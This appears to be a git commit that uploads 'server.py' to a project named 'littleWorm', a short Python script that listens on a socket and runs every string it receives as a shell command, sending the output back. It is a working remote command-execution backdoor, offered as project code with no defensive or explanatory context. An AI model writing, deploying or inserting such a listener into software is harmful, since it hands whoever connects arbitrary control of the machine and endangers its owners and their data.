4fbe9c97c6395f4a92e9e82bf641a2ed2303e21a
ruaorj <liechoices@protonmail.com>
2024-12-04 10:18:23 +0000

    Add files via upload

---
+++ littleWorm/server.py
@@ -0,0 +1,25 @@
+import socket
+import subprocess
+
+host = "127.0.0.1"
+port = 666
+
+server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server_socket.bind((host,port))
+server_socket.listen()
+
+conn, addr = server_socket.accept()
+print("Connected from :"+str(addr))
+
+while True:
+    data = conn.recv(1024).decode()
+    print(f"Client{addr}: {data}")
+
+    result = subprocess.run(data,stdout=subprocess.PIPE, shell=True)
+
+    if(result.stdout.decode()!=""):
+        response_data = result.stdout 
+    else:
+        response_data = ("Command Executed!").encode()
+    conn.send(response_data)
+conn.close()
